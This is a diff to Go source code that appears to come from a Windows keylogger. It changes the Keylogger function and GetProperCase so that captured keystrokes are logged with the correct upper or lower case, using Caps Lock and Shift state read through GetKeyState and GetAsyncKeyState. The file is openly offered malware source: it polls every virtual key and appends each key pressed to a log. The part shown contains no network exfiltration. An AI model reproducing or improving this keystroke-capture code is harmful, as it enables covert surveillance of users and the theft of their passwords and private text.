@@ -275,14 +275,23 @@ func GetOSInformation() string {
 
 
 func IsPressed(key uintptr) bool {
-	if key&0x8000 != 0 {
+	fmt.Println(key & 0x8000)
+	if key&0x8000 != 0 { // is most significant bit set?
 		return true
 	}
 	return false
 }
 
-func GetProperCase(shiftStatus uintptr, ifPressed, ifNotPressed string) string {
-	if IsPressed(shiftStatus) {
+func GetProperCase(ifPressed, ifNotPressed string, acknowledgeCaps bool) string {
+	CapsLock, _, _ := GetKeyState.Call(uintptr(0x14))
+	ShiftKey, _, _ := GetAsyncKeyState.Call(uintptr(0x10))
+
+	var CapsIsActivated = false
+	if acknowledgeCaps {
+		CapsIsActivated = CapsLock&0x0001 != 0
+	}
+
+	if IsPressed(ShiftKey) || CapsIsActivated {
 		return ifPressed
 	}
 	return ifNotPressed
@@ -295,7 +304,6 @@ func Keylogger() {
 
 		for i := 0; i < 256; i++ {
 			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))
-			ShiftKey, _, _ := GetAsyncKeyState.Call(uintptr(0x10))
 
 			if Result&0x1 == 0 {
 				continue
@@ -343,79 +351,79 @@ func Keylogger() {
 			case 46:
 				Logs += "[Delete]"
 			case 48:
-				Logs += GetProperCase(ShiftKey, "[)]", "[0]")
+				Logs += GetProperCase("[)]", "[0]", false)
 			case 49:
-				Logs += GetProperCase(ShiftKey, "[!]", "[1]")
+				Logs += GetProperCase("[!]", "[1]", false)
 			case 50:
-				Logs += GetProperCase(ShiftKey, "[@]", "[2]")
+				Logs += GetProperCase("[@]", "[2]", false)
 			case 51:
-				Logs += GetProperCase(ShiftKey, "[#]", "[3]")
+				Logs += GetProperCase("[#]", "[3]", false)
 			case 52:
-				Logs += GetProperCase(ShiftKey, "[$]", "[4]")
+				Logs += GetProperCase("[$]", "[4]", false)
 			case 53:
-				Logs += GetProperCase(ShiftKey, "[%]", "[5]")
+				Logs += GetProperCase("[%]", "[5]", false)
 			case 54:
-				Logs += GetProperCase(ShiftKey, "[^]", "[6]")
+				Logs += GetProperCase("[^]", "[6]", false)
 			case 55:
-				Logs += GetProperCase(ShiftKey, "[&]", "[7]")
+				Logs += GetProperCase("[&]", "[7]", false)
 			case 56:
-				Logs += GetProperCase(ShiftKey, "[*]", "[8]")
+				Logs += GetProperCase("[*]", "[8]", false)
 			case 57:
-				Logs += GetProperCase(ShiftKey, "[(]", "[9]")
+				Logs += GetProperCase("[(]", "[9]", false)
 			case 65:
-				Logs += GetProperCase(ShiftKey, "[A]", "[a]")
+				Logs += GetProperCase("[A]", "[a]", true)
 			case 66:
-				Logs += GetProperCase(ShiftKey, "[B]", "[b]")
+				Logs += GetProperCase("[B]", "[b]", true)
 			case 67:
-				Logs += GetProperCase(ShiftKey, "[C]", "[c]")
+				Logs += GetProperCase("[C]", "[c]", true)
 			case 186:
-				Logs += GetProperCase(ShiftKey, "[Ç]", "[ç]")
+				Logs += GetProperCase("[Ç]", "[ç]", true)
 			case 68:
-				Logs += GetProperCase(ShiftKey, "[D]", "[d]")
+				Logs += GetProperCase("[D]", "[d]", true)
 			case 69:
-				Logs += GetProperCase(ShiftKey, "[E]", "[e]")
+				Logs += GetProperCase("[E]", "[e]", true)
 			case 70:
-				Logs += GetProperCase(ShiftKey, "[F]", "[f]")
+				Logs += GetProperCase("[F]", "[f]", true)
 			case 71:
-				Logs += GetProperCase(ShiftKey, "[G]", "[g]")
+				Logs += GetProperCase("[G]", "[g]", true)
 			case 72:
-				Logs += GetProperCase(ShiftKey, "[H]", "[h]")
+				Logs += GetProperCase("[H]", "[h]", true)
 			case 73:
-				Logs += GetProperCase(ShiftKey, "[I]", "[i]")
+				Logs += GetProperCase("[I]", "[i]", true)
 			case 74:
-				Logs += GetProperCase(ShiftKey, "[J]", "[j]")
+				Logs += GetProperCase("[J]", "[j]", true)
 			case 75:
-				Logs += GetProperCase(ShiftKey, "[K]", "[k]")
+				Logs += GetProperCase("[K]", "[k]", true)
 			case 76:
-				Logs += GetProperCase(ShiftKey, "[L]", "[l]")
+				Logs += GetProperCase("[L]", "[l]", true)
 			case 77:
-				Logs += GetProperCase(ShiftKey, "[M]", "[m]")
+				Logs += GetProperCase("[M]", "[m]", true)
 			case 78:
-				Logs += GetProperCase(ShiftKey, "[N]", "[n]")
+				Logs += GetProperCase("[N]", "[n]", true)
 			case 79:
-				Logs += GetProperCase(ShiftKey, "[O]", "[o]")
+				Logs += GetProperCase("[O]", "[o]", true)
 			case 80:
-				Logs += GetProperCase(ShiftKey, "[P]", "[p]")
+				Logs += GetProperCase("[P]", "[p]", true)
 			case 81:
-				Logs += GetProperCase(ShiftKey, "[Q]", "[q]")
+				Logs += GetProperCase("[Q]", "[q]", true)
 			case 82:
-				Logs += GetProperCase(ShiftKey, "[R]", "[r]")
+				Logs += GetProperCase("[R]", "[r]", true)
 			case 83:
-				Logs += GetProperCase(ShiftKey, "[S]", "[s]")
+				Logs += GetProperCase("[S]", "[s]", true)
 			case 84:
-				Logs += GetProperCase(ShiftKey, "[T]", "[t]")
+				Logs += GetProperCase("[T]", "[t]", true)
 			case 85:
-				Logs += GetProperCase(ShiftKey, "[U]", "[u]")
+				Logs += GetProperCase("[U]", "[u]", true)
 			case 86:
-				Logs += GetProperCase(ShiftKey, "[V]", "[v]")
+				Logs += GetProperCase("[V]", "[v]", true)
 			case 87:
-				Logs += GetProperCase(ShiftKey, "[W]", "[w]")
+				Logs += GetProperCase("[W]", "[w]", true)
 			case 88:
-				Logs += GetProperCase(ShiftKey, "[X]", "[x]")
+				Logs += GetProperCase("[X]", "[x]", true)
 			case 89:
-				Logs += GetProperCase(ShiftKey, "[Y]", "[y]")
+				Logs += GetProperCase("[Y]", "[y]", true)
 			case 90:
-				Logs += GetProperCase(ShiftKey, "[Z]", "[z]")
+				Logs += GetProperCase("[Z]", "[z]", true)
 			case 96:
 				Logs += "0"
 			case 97:
@@ -477,25 +485,25 @@ func Keylogger() {
 			case 144:
 				Logs += "[NumLock]"
 			case 189:
-				Logs += GetProperCase(ShiftKey, "[_]", "[-]")
+				Logs += GetProperCase("[_]", "[-]", false)
 			case 187:
-				Logs += GetProperCase(ShiftKey, "[+]", "[=]")
+				Logs += GetProperCase("[+]", "[=]", false)
 			case 188:
-				Logs += GetProperCase(ShiftKey, "[<]", "[,]")
+				Logs += GetProperCase("[<]", "[,]", false)
 			case 190:
-				Logs += GetProperCase(ShiftKey, "[>]", "[.]")
+				Logs += GetProperCase("[>]", "[.]", false)
 			case 191:
-				Logs += GetProperCase(ShiftKey, "[:]", "[;]")
+				Logs += GetProperCase("[:]", "[;]", false)
 			case 192:
-				Logs += GetProperCase(ShiftKey, "[\"]", "[']")
+				Logs += GetProperCase("[\"]", "[']", false)
 			case 193:
-				Logs += GetProperCase(ShiftKey, "[?]", "[/]")
+				Logs += GetProperCase("[?]", "[/]", false)
 			case 221:
-				Logs += GetProperCase(ShiftKey, "[{]", "[[]")
+				Logs += GetProperCase("[{]", "[[]", false)
 			case 220:
-				Logs += GetProperCase(ShiftKey, "[}]", "[]]")
+				Logs += GetProperCase("[}]", "[]]", false)
 			case 226:
-				Logs += GetProperCase(ShiftKey, "[|]", "[\\]")
+				Logs += GetProperCase("[|]", "[\\]", false)
 			}
 		}
 	}
